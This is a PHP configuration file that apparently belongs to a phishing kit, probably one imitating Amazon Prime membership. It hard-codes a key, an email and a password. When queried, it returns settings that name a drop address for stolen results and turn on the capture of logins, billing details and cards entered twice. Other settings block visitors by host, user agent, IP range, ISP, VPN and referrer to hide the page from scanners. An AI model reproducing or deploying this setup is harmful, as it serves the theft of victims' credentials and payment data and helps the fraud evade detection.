<?php
$key = "kontolodon";
$email ="cafc@br40ck.com";
$password = "idbte4m";

/*

*/
if(isset($_GET['config'])){
	header("Content-Type: application/json");
	echo
	'{
	"email_result":"bimaini@amzprimembershipaasdja.com",
	"sender_mail":"mzgantz@tampungangantz.com",
	"site_parameter":"kjasndioasjdkqweujqiwej",
	"site_password":"",
	"site_param_on":"on",
	"site_pass_on":"",
	"send_login":"on",
	"double_cc":"on",
	"get_billing":"on",
	"get_photo":"",
	"get_email":"",
	"onetime":"on",
	"block_host":"on",
	"block_ua":"on",
	"block_iprange":"on",
	"block_isp":"on",
	"block_vpn":"on",
	"block_referrer":"on"
}';
}
?>